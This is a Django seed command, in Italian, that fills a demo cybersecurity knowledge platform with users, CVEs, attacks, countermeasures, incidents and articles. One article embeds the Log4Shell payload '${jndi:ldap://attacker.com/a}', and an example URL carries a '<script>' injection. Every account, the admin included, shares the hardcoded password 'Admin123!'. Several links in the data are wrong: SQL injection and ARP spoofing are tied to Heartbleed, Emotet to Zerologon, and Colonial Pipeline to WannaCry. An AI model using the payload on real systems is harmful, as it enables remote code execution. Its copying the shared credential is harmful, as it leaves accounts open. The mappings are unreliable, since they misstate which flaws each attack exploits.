"""
Comando: python manage.py seed
Popola il database con dati di esempio per la demo d'esame.
"""
from django.core.management.base import BaseCommand
from django.contrib.auth.hashers import make_password
from django.db import transaction
from datetime import date

from core.models import (
    Utenti, Attacco, AttaccoRete, AttaccoWeb, AttaccoSocial, AttaccoMalware,
    Vulnerabilita, Contromisura, CasoReale, Articolo,
    Interazione, InterazioneAttacco, InterazioneArticolo, InterazioneCaso,
    Sfrutta, Mitiga, Seguito,
)


class Command(BaseCommand):
    help = 'Popola il database con dati di esempio'

    def handle(self, *args, **options):
        self.stdout.write('Pulizia database...')
        Seguito.objects.all().delete()
        InterazioneAttacco.objects.all().delete()
        InterazioneArticolo.objects.all().delete()
        InterazioneCaso.objects.all().delete()
        Interazione.objects.all().delete()
        Sfrutta.objects.all().delete()
        Mitiga.objects.all().delete()
        CasoReale.objects.all().delete()
        Articolo.objects.all().delete()
        AttaccoRete.objects.all().delete()
        AttaccoWeb.objects.all().delete()
        AttaccoSocial.objects.all().delete()
        AttaccoMalware.objects.all().delete()
        Attacco.objects.all().delete()
        Vulnerabilita.objects.all().delete()
        Contromisura.objects.all().delete()
        Utenti.objects.all().delete()

        pwd = make_password('Admin123!')

        self.stdout.write('Creazione utenti...')
        u0 = Utenti.objects.create(username='ospite', email='ospite@cp.it', password=pwd, livello=0, bio='Semplice visitatore.')
        u1 = Utenti.objects.create(username='studente', email='studente@cp.it', password=pwd, livello=3, bio='Studente di cybersecurity.')
        u2 = Utenti.objects.create(username='analista', email='analista@cp.it', password=pwd, livello=5, bio='Analista di sicurezza.')
        u3 = Utenti.objects.create(username='ricercatore', email='ricercatore@cp.it', password=pwd, livello=10, bio='Ricercatore senior in sicurezza informatica.')
        u4 = Utenti.objects.create(username='esperto', email='esperto@cp.it', password=pwd, livello=15, bio='Esperto di penetration testing.')
        u5 = Utenti.objects.create(username='admin_cp', email='admin@cp.it', password=pwd, livello=20, bio='Amministratore della piattaforma.')

        self.stdout.write('Creazione vulnerabilità...')
        v1 = Vulnerabilita.objects.create(codice_cve='CVE-2021-44228', descrizione='Log4Shell: RCE in Apache Log4j 2', cvss_score=10.0, software_affetto='Apache Log4j 2.x', anno_scoperta=2021)
        v2 = Vulnerabilita.objects.create(codice_cve='CVE-2017-0144', descrizione='EternalBlue: SMBv1 RCE in Windows', cvss_score=9.3, software_affetto='Microsoft Windows SMBv1', anno_scoperta=2017)
        v3 = Vulnerabilita.objects.create(codice_cve='CVE-2014-0160', descrizione='Heartbleed: buffer over-read in OpenSSL', cvss_score=7.5, software_affetto='OpenSSL 1.0.1–1.0.1f', anno_scoperta=2014)
        v4 = Vulnerabilita.objects.create(codice_cve='CVE-2021-26855', descrizione='ProxyLogon: SSRF in Microsoft Exchange', cvss_score=9.8, software_affetto='Microsoft Exchange Server', anno_scoperta=2021)
        v5 = Vulnerabilita.objects.create(codice_cve='CVE-2019-0708', descrizione='BlueKeep: RCE in Windows RDP', cvss_score=9.8, software_affetto='Windows 7, XP, Server 2003/2008', anno_scoperta=2019)
        v6 = Vulnerabilita.objects.create(codice_cve='CVE-2022-30190', descrizione='Follina: MSDT RCE via Office documents', cvss_score=7.8, software_affetto='Microsoft Windows MSDT', anno_scoperta=2022)
        v7 = Vulnerabilita.objects.create(codice_cve='CVE-2023-23397', descrizione='Outlook zero-click privilege escalation', cvss_score=9.8, software_affetto='Microsoft Outlook', anno_scoperta=2023)
        v8 = Vulnerabilita.objects.create(codice_cve='CVE-2023-44487', descrizione='HTTP/2 Rapid Reset — DoS', cvss_score=7.5, software_affetto='Vari server HTTP/2', anno_scoperta=2023)
        v9 = Vulnerabilita.objects.create(codice_cve='CVE-2024-3094', descrizione='XZ Utils backdoor', cvss_score=10.0, software_affetto='XZ Utils 5.6.0-5.6.1', anno_scoperta=2024)
        v10 = Vulnerabilita.objects.create(codice_cve='CVE-2020-1472', descrizione='Zerologon: privilege escalation in Netlogon', cvss_score=10.0, software_affetto='Windows Server Netlogon', anno_scoperta=2020)

        self.stdout.write('Creazione contromisure...')
        c1 = Contromisura.objects.create(nome='Patch Management sistematico', descrizione='Aggiornamento regolare di tutti i software e sistemi operativi per eliminare vulnerabilità note.', tipo='preventiva')
        c2 = Contromisura.objects.create(nome='Web Application Firewall (WAF)', descrizione='Filtro del traffico HTTP/HTTPS per bloccare attacchi web comuni (SQLi, XSS, CSRF).', tipo='preventiva')
        c3 = Contromisura.objects.create(nome='Intrusion Detection System (IDS)', descrizione='Monitoraggio del traffico di rete per identificare pattern di attacco noti.', tipo='rilevativa')
        c4 = Contromisura.objects.create(nome='Antivirus ed EDR', descrizione='Rilevamento e blocco di malware tramite firme e analisi comportamentale.', tipo='rilevativa')
        c5 = Contromisura.objects.create(nome='Formazione anti-phishing', descrizione='Training periodico per riconoscere email e messaggi di social engineering.', tipo='preventiva')
        c6 = Contromisura.objects.create(nome='Segmentazione di rete', descrizione='Isolamento dei segmenti di rete per limitare la propagazione laterale degli attacchi.', tipo='preventiva')
        c7 = Contromisura.objects.create(nome='Backup e disaster recovery', descrizione='Backup regolari offline/offsite per ripristino rapido dopo incidenti ransomware.', tipo='correttiva')
        c8 = Contromisura.objects.create(nome='Autenticazione a più fattori (MFA)', descrizione='Richiesta di secondo fattore di autenticazione per accessi critici.', tipo='preventiva')

        self.stdout.write('Creazione attacchi...')
        a1 = Attacco.objects.create(nome='WannaCry Ransomware', descrizione='Ransomware worm che sfrutta EternalBlue per propagarsi sulle reti Windows, cifrando i file e richiedendo riscatto in Bitcoin.', severita='critica', data_pubblicazione=date(2017, 5, 12), riferimento_mitre='T1486', id_autore=u4)
        AttaccoMalware.objects.create(attacco=a1, tipo_payload='Ransomware', persistenza=True, propagazione='SMBv1 via EternalBlue (CVE-2017-0144)')

        a2 = Attacco.objects.create(nome='SQL Injection su login form', descrizione='Iniezione di codice SQL tramite campi di login non sanitizzati per bypassare l\'autenticazione o estrarre dati dal database.', severita='alta', data_pubblicazione=date(2022, 3, 15), riferimento_mitre='T1190', id_autore=u3)
        AttaccoWeb.objects.create(attacco=a2, tipo_injection='SQL Injection', owasp_category='A03', url_esempio='https://example.com/login')

        a3 = Attacco.objects.create(nome='Phishing via email CEO Fraud', descrizione='Email fraudolenta che impersona il CEO per indurre dipendenti a effettuare bonifici non autorizzati o condividere credenziali.', severita='alta', data_pubblicazione=date(2023, 1, 10), riferimento_mitre='T1566.001', id_autore=u3)
        AttaccoSocial.objects.create(attacco=a3, canale='email', leva_psicologica='Autorità e urgenza')

        a4 = Attacco.objects.create(nome='SYN Flood DDoS', descrizione='Attacco di negazione del servizio che inonda il target con pacchetti SYN TCP incompleti, esaurendo le risorse del server.', severita='media', data_pubblicazione=date(2021, 7, 20), riferimento_mitre='T1498.001', id_autore=u3)
        AttaccoRete.objects.create(attacco=a4, protocollo='TCP', porta_bersaglio=80, livello_osi='Trasporto (L4)')

        a5 = Attacco.objects.create(nome='NotPetya Wiper', descrizione='Malware distruttivo mascherato da ransomware che sovrascrive il MBR e cifra i file, causando danni irreversibili.', severita='critica', data_pubblicazione=date(2017, 6, 27), riferimento_mitre='T1561.002', id_autore=u4)
        AttaccoMalware.objects.create(attacco=a5, tipo_payload='Wiper/Pseudo-ransomware', persistenza=False, propagazione='SMBv1 + WMIC + PSEXEC')

        a6 = Attacco.objects.create(nome='Cross-Site Scripting (XSS) Reflected', descrizione='Iniezione di script JavaScript tramite parametri URL che vengono riflessi nella pagina, eseguendo codice nel browser della vittima.', severita='media', data_pubblicazione=date(2022, 9, 5), riferimento_mitre='T1059.007', id_autore=u3)
        AttaccoWeb.objects.create(attacco=a6, tipo_injection='JavaScript injection', owasp_category='A03', url_esempio='https://example.com/search?q=<script>')

        a7 = Attacco.objects.create(nome='Smishing — Falso corriere', descrizione='SMS fraudolento che simula una notifica di consegna pacchi per rubare dati della carta di credito tramite sito clone.', severita='media', data_pubblicazione=date(2023, 6, 1), riferimento_mitre='T1566.004', id_autore=u3)
        AttaccoSocial.objects.create(attacco=a7, canale='sms', leva_psicologica='Aspettativa e curiosità')

        a8 = Attacco.objects.create(nome='ARP Spoofing / Man in the Middle', descrizione='Avvelenamento della cache ARP per intercettare il traffico tra due host sulla stessa LAN, consentendo la cattura di credenziali.', severita='alta', data_pubblicazione=date(2021, 4, 14), riferimento_mitre='T1557.002', id_autore=u3)
        AttaccoRete.objects.create(attacco=a8, protocollo='ARP', porta_bersaglio=None, livello_osi='Collegamento (L2)')

        a9 = Attacco.objects.create(nome='Log4Shell (CVE-2021-44228)', descrizione='RCE critica in Apache Log4j tramite interpolazione JNDI in messaggi di log, sfruttabile da remoto senza autenticazione.', severita='critica', data_pubblicazione=date(2021, 12, 10), riferimento_mitre='T1190', id_autore=u4)
        AttaccoWeb.objects.create(attacco=a9, tipo_injection='JNDI Injection', owasp_category='A06', url_esempio='')

        a10 = Attacco.objects.create(nome='Emotet Trojan bancario', descrizione='Trojan modulare distribuito via email spam che funge da dropper per altre famiglie malware (TrickBot, Ryuk).', severita='critica', data_pubblicazione=date(2020, 11, 3), riferimento_mitre='T1566.001', id_autore=u4)
        AttaccoMalware.objects.create(attacco=a10, tipo_payload='Trojan/Dropper', persistenza=True, propagazione='Email spam con allegati Office malevoli')

        a11 = Attacco.objects.create(nome='DNS Tunneling', descrizione='Uso del protocollo DNS per esfiltrare dati o creare canali C2 nascosti, sfruttando la rarità dei controlli sul traffico DNS.', severita='media', data_pubblicazione=date(2022, 5, 20), riferimento_mitre='T1071.004', id_autore=u3)
        AttaccoRete.objects.create(attacco=a11, protocollo='DNS/UDP', porta_bersaglio=53, livello_osi='Applicazione (L7)')

        a12 = Attacco.objects.create(nome='Vishing — Supporto tecnico falso', descrizione='Telefonata fraudolenta che impersona supporto tecnico Microsoft per ottenere accesso remoto al PC della vittima.', severita='bassa', data_pubblicazione=date(2023, 3, 22), riferimento_mitre='T1566.004', id_autore=u3)
        AttaccoSocial.objects.create(attacco=a12, canale='telefono', leva_psicologica='Paura e autorità tecnica')

        a13 = Attacco.objects.create(nome='Broken Access Control — IDOR', descrizione='Accesso diretto a oggetti tramite modifica dell\'ID nella URL senza verifica dei permessi, espone dati di altri utenti.', severita='alta', data_pubblicazione=date(2023, 8, 15), riferimento_mitre='T1078', id_autore=u3)
        AttaccoWeb.objects.create(attacco=a13, tipo_injection='IDOR', owasp_category='A01', url_esempio='https://app.com/api/users/1337/data')

        a14 = Attacco.objects.create(nome='Cobalt Strike Beacon', descrizione='Agente C2 commerciale usato dai threat actors per post-exploitation: movimento laterale, keylogging, screenshot.', severita='critica', data_pubblicazione=date(2022, 1, 5), riferimento_mitre='T1219', id_autore=u4)
        AttaccoMalware.objects.create(attacco=a14, tipo_payload='RAT/C2 Framework', persistenza=True, propagazione='Spear phishing + macro Office')

        a15 = Attacco.objects.create(nome='BGP Hijacking', descrizione='Annuncio fraudolento di prefissi IP BGP per dirottare il traffico Internet attraverso infrastrutture controllate dall\'attaccante.', severita='alta', data_pubblicazione=date(2020, 8, 10), riferimento_mitre='T1557', id_autore=u4)
        AttaccoRete.objects.create(attacco=a15, protocollo='BGP/TCP', porta_bersaglio=179, livello_osi='Rete (L3)')

        a16 = Attacco.objects.create(nome='Credential Stuffing', descrizione='Uso di liste di credenziali trapelate da data breach per tentare l\'accesso automatizzato su altri servizi, sfruttando il riuso delle password.', severita='media', data_pubblicazione=date(2023, 11, 20), riferimento_mitre='T1110.004', id_autore=u3)
        AttaccoWeb.objects.create(attacco=a16, tipo_injection='Brute force / credential reuse', owasp_category='A07', url_esempio='')

        self.stdout.write('Associazioni vulnerabilita - attacchi...')
        Sfrutta.objects.create(id_attacco=a1, id_vulnerabilita=v2)
        Sfrutta.objects.create(id_attacco=a5, id_vulnerabilita=v2)
        Sfrutta.objects.create(id_attacco=a9, id_vulnerabilita=v1)
        Sfrutta.objects.create(id_attacco=a4, id_vulnerabilita=v5)
        Sfrutta.objects.create(id_attacco=a8, id_vulnerabilita=v3)
        Sfrutta.objects.create(id_attacco=a2, id_vulnerabilita=v3)
        Sfrutta.objects.create(id_attacco=a14, id_vulnerabilita=v6)
        Sfrutta.objects.create(id_attacco=a3, id_vulnerabilita=v7)
        Sfrutta.objects.create(id_attacco=a4, id_vulnerabilita=v8)
        Sfrutta.objects.create(id_attacco=a10, id_vulnerabilita=v10)

        self.stdout.write('Associazioni contromisure - attacchi (mitiga)...')
        Mitiga.objects.create(id_contromisura=c1, id_attacco=a1, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c1, id_attacco=a5, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c1, id_attacco=a9, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c2, id_attacco=a2, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c2, id_attacco=a6, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c2, id_attacco=a9, efficacia='media')
        Mitiga.objects.create(id_contromisura=c3, id_attacco=a4, efficacia='media')
        Mitiga.objects.create(id_contromisura=c3, id_attacco=a8, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c3, id_attacco=a11, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c4, id_attacco=a1, efficacia='media')
        Mitiga.objects.create(id_contromisura=c4, id_attacco=a10, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c4, id_attacco=a14, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c5, id_attacco=a3, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c5, id_attacco=a7, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c5, id_attacco=a12, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c6, id_attacco=a1, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c6, id_attacco=a8, efficacia='media')
        Mitiga.objects.create(id_contromisura=c6, id_attacco=a11, efficacia='media')
        Mitiga.objects.create(id_contromisura=c7, id_attacco=a1, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c7, id_attacco=a5, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c7, id_attacco=a10, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c8, id_attacco=a3, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c8, id_attacco=a16, efficacia='alta')
        Mitiga.objects.create(id_contromisura=c8, id_attacco=a13, efficacia='media')

        self.stdout.write('Creazione casi reali...')
        CasoReale.objects.create(nome_incidente='WannaCry NHS UK', anno=2017, vittima='NHS (UK)', danno_stimato_usd=92000000, descrizione_breve='Ospedali britannici paralizzati: sale operatorie chiuse, ambulanze dirottate.', id_attacco=a1)
        CasoReale.objects.create(nome_incidente='NotPetya Maersk', anno=2017, vittima='Maersk', danno_stimato_usd=300000000, descrizione_breve='Shipping giant perde 300M USD, reinstalla 45.000 PC in 10 giorni.', id_attacco=a5)
        CasoReale.objects.create(nome_incidente='Log4Shell Apache Foundation', anno=2021, vittima='Varie organizzazioni', danno_stimato_usd=None, descrizione_breve='Milioni di server vulnerabili a RCE in pochi giorni dalla scoperta.', id_attacco=a9)
        CasoReale.objects.create(nome_incidente='SolarWinds Supply Chain', anno=2020, vittima='US Government / Fortune 500', danno_stimato_usd=None, descrizione_breve='APT29 compromette l\'aggiornamento di SolarWinds Orion, colpendo 18.000 organizzazioni.', id_attacco=a14)
        CasoReale.objects.create(nome_incidente='Twitter CEO Fraud 2020', anno=2020, vittima='Twitter', danno_stimato_usd=121000, descrizione_breve='Teenager ottiene accesso admin via social engineering per twittare da account Biden, Obama, Musk.', id_attacco=a3)
        CasoReale.objects.create(nome_incidente='Cloudflare HTTP/2 Rapid Reset', anno=2023, vittima='Cloudflare', danno_stimato_usd=None, descrizione_breve='Record DDoS da 201 Mrps sfruttando CVE-2023-44487.', id_attacco=a4)
        CasoReale.objects.create(nome_incidente='Emotet Campagna 2021', anno=2021, vittima='Organizzazioni europee', danno_stimato_usd=2500000000, descrizione_breve='Botnet Emotet causa 2.5B USD di danni globali prima del takedown Europol.', id_attacco=a10)
        CasoReale.objects.create(nome_incidente='BGP Hijack Pakistan Telecom vs YouTube', anno=2008, vittima='YouTube / Internet globale', danno_stimato_usd=None, descrizione_breve='Pakistan Telecom blocca YouTube globalmente per 2 ore per errore/BGP hijack.', id_attacco=a15)
        CasoReale.objects.create(nome_incidente='Colonial Pipeline Ransomware', anno=2021, vittima='Colonial Pipeline', danno_stimato_usd=4400000, descrizione_breve='Oleodotto USA paralizzato da DarkSide via credenziali VPN rubate.', id_attacco=a1)
        CasoReale.objects.create(nome_incidente='Phishing CEO BEC — Ubiquiti', anno=2015, vittima='Ubiquiti Networks', danno_stimato_usd=46700000, descrizione_breve='CEO Fraud via email porta a trasferimento fraudolento di 46.7M USD verso conti esteri.', id_attacco=a3)
        CasoReale.objects.create(nome_incidente='XSS MySpace Samy Worm', anno=2005, vittima='MySpace', danno_stimato_usd=None, descrizione_breve='Worm XSS si propaga automaticamente aggiungendo Samy come amico: 1M di profili in 20 ore.', id_attacco=a6)
        CasoReale.objects.create(nome_incidente='Credential Stuffing Dunkin Donuts', anno=2019, vittima='Dunkin\' Donuts', danno_stimato_usd=None, descrizione_breve='Attaccanti usano 300.000 credenziali rubate per accedere a account DD Perks.', id_attacco=a16)
        CasoReale.objects.create(nome_incidente='WannaCry Deutsche Bahn', anno=2017, vittima='Deutsche Bahn', danno_stimato_usd=None, descrizione_breve='Pannelli informativi ferroviari tedeschi visualizzano richiesta di riscatto WannaCry.', id_attacco=a1)
        CasoReale.objects.create(nome_incidente='Heartbleed OpenSSL Canada Revenue', anno=2014, vittima='Canada Revenue Agency', danno_stimato_usd=None, descrizione_breve='900 codici fiscali canadesi trafugati tramite exploit Heartbleed.', id_attacco=a8)
        CasoReale.objects.create(nome_incidente='Log4Shell VMware vCenter', anno=2022, vittima='Varie aziende', danno_stimato_usd=None, descrizione_breve='Ransomware group sfrutta Log4Shell su vCenter per cifrare ambienti virtuali.', id_attacco=a9)

        self.stdout.write('Creazione articoli...')
        art1 = Articolo.objects.create(titolo='Come proteggere la tua rete dagli attacchi SMB', testo='I protocolli SMBv1 sono la principale via di propagazione di worm come WannaCry e NotPetya. In questo articolo vedremo come disabilitare SMBv1 su Windows, applicare le patch MS17-010 e segmentare la rete per limitare la propagazione laterale.\n\nPasso 1: Disabilita SMBv1\nPowershell: Set-SmbServerConfiguration -EnableSMB1Protocol $false\n\nPasso 2: Applica MS17-010\nScaricare e applicare la patch critica Microsoft per tutte le versioni supportate.\n\nPasso 3: Firewall\nBlocca le porte 135, 139, 445 dall\'esterno e tra segmenti non necessari.', id_autore=u3)
        art2 = Articolo.objects.create(titolo='OWASP Top 10 2021: cosa è cambiato', testo='L\'OWASP Top 10 2021 porta significative novità rispetto alla versione 2017. Broken Access Control scala al primo posto, surclassando Injection che scende al terzo. Vengono introdotte tre nuove categorie: Insecure Design (A04), Software and Data Integrity Failures (A08) e Server-Side Request Forgery (A10).\n\nPer chi sviluppa applicazioni web, queste categorie devono diventare riferimento nel threat modeling e nel code review sistematico.', id_autore=u4)
        art3 = Articolo.objects.create(titolo='Log4Shell: anatomia di una vulnerabilità critica', testo='CVE-2021-44228, noto come Log4Shell, è una vulnerabilità di remote code execution nel framework di logging Java Apache Log4j 2. Sfrutta la funzionalità di lookup JNDI (Java Naming and Directory Interface) per caricare classi Java arbitrarie da server remoti.\n\nUno string come ${jndi:ldap://attacker.com/a} all\'interno di un messaggio di log è sufficiente a compromettere il server. La patch è disponibile dalla versione 2.15.0.', id_autore=u4)
        art4 = Articolo.objects.create(titolo='Ingegneria sociale: le 6 leve psicologiche di Cialdini', testo='Robert Cialdini ha identificato 6 principi di influenza sociale che i social engineer sfruttano sistematicamente:\n\n1. Reciprocità\n2. Impegno e coerenza\n3. Riprova sociale\n4. Autorità\n5. Simpatia\n6. Scarcity (urgenza)\n\nLa consapevolezza di questi principi è il primo passo per la difesa dal phishing, vishing e smishing. La formazione periodica del personale riduce significativamente il tasso di successo di questi attacchi.', id_autore=u3)
        art5 = Articolo.objects.create(titolo='Guida al penetration testing: fasi e metodologia', testo='Il penetration testing è un processo strutturato in fasi:\n\n1. Reconnaissance: raccolta passiva e attiva di informazioni\n2. Scanning: identificazione di host, porte e servizi\n3. Exploitation: sfruttamento delle vulnerabilità identificate\n4. Post-Exploitation: movimento laterale e persistence\n5. Reporting: documentazione dettagliata con severity e raccomandazioni\n\nLe metodologie di riferimento includono PTES, OWASP Testing Guide e NIST SP 800-115.', id_autore=u4)

        self.stdout.write('Creazione follow...')
        Seguito.objects.create(id_seguace=u0, id_utente_seguito=u3)
        Seguito.objects.create(id_seguace=u0, id_utente_seguito=u4)
        Seguito.objects.create(id_seguace=u1, id_utente_seguito=u3)
        Seguito.objects.create(id_seguace=u1, id_utente_seguito=u4)
        Seguito.objects.create(id_seguace=u2, id_utente_seguito=u3)
        Seguito.objects.create(id_seguace=u2, id_utente_seguito=u4)
        Seguito.objects.create(id_seguace=u5, id_utente_seguito=u3)
        Seguito.objects.create(id_seguace=u5, id_utente_seguito=u4)
        Seguito.objects.create(id_seguace=u3, id_utente_seguito=u4)

        self.stdout.write('Creazione interazioni...')
        i1 = Interazione.objects.create(tipo='commento', testo_commento='Ottima analisi! WannaCry ha davvero devastato il settore sanitario.', id_utente=u1)
        InterazioneAttacco.objects.create(interazione=i1, id_attacco=a1)
        i2 = Interazione.objects.create(tipo='like', id_utente=u1)
        InterazioneAttacco.objects.create(interazione=i2, id_attacco=a1)
        i3 = Interazione.objects.create(tipo='like', id_utente=u2)
        InterazioneAttacco.objects.create(interazione=i3, id_attacco=a1)
        i4 = Interazione.objects.create(tipo='commento', testo_commento='Log4Shell è stato il momento più critico del 2021 per la sicurezza enterprise.', id_utente=u2)
        InterazioneAttacco.objects.create(interazione=i4, id_attacco=a9)
        i5 = Interazione.objects.create(tipo='like', id_utente=u0)
        InterazioneAttacco.objects.create(interazione=i5, id_attacco=a9)
        i6 = Interazione.objects.create(tipo='commento', testo_commento='Articolo molto utile per la formazione del personale.', id_utente=u0)
        InterazioneArticolo.objects.create(interazione=i6, id_articolo=art4)
        i7 = Interazione.objects.create(tipo='like', id_utente=u1)
        InterazioneArticolo.objects.create(interazione=i7, id_articolo=art1)
        i8 = Interazione.objects.create(tipo='like', id_utente=u2)
        InterazioneArticolo.objects.create(interazione=i8, id_articolo=art3)
        i9 = Interazione.objects.create(tipo='commento', testo_commento='Il caso Colonial Pipeline dimostra quanto sia critica la supply chain energetica.', id_utente=u2)
        InterazioneCaso.objects.create(interazione=i9, id_caso=CasoReale.objects.get(nome_incidente='Colonial Pipeline Ransomware'))
        i10 = Interazione.objects.create(tipo='like', id_utente=u1)
        InterazioneCaso.objects.create(interazione=i10, id_caso=CasoReale.objects.get(nome_incidente='Colonial Pipeline Ransomware'))

        self.stdout.write(self.style.SUCCESS('\nSeed completato!'))
        self.stdout.write(f'  Utenti: {Utenti.objects.count()} (password: Admin123!)')
        self.stdout.write(f'  Attacchi: {Attacco.objects.count()} (4 famiglie)')
        self.stdout.write(f'  Vulnerabilità: {Vulnerabilita.objects.count()}')
        self.stdout.write(f'  Contromisure: {Contromisura.objects.count()}')
        self.stdout.write(f'  Casi reali: {CasoReale.objects.count()}')
        self.stdout.write(f'  Articoli: {Articolo.objects.count()}')
        self.stdout.write(f'  Interazioni: {Interazione.objects.count()}')
